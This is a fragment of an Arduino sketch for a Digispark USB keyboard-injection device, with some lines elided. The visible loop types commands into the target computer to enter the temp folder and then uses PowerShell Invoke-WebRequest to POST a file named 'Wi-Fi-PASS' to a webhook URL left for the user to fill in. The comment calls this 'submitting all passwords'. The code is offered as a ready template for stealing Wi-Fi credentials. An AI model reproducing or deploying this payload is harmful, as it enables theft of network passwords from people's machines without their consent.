...
void loop() {
  ...
  DigiKeyboard.delay(100);
  DigiKeyboard.println("cd %temp%"); //go to temporary dir
  DigiKeyboard.delay(500);
  ...
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("powershell Invoke-WebRequest -Uri YOUR WEBHOOK URL GOES HERE -Method POST -InFile Wi-Fi-PASS"); //Submitting all passwords on hook
  DigiKeyboard.delay(1000);
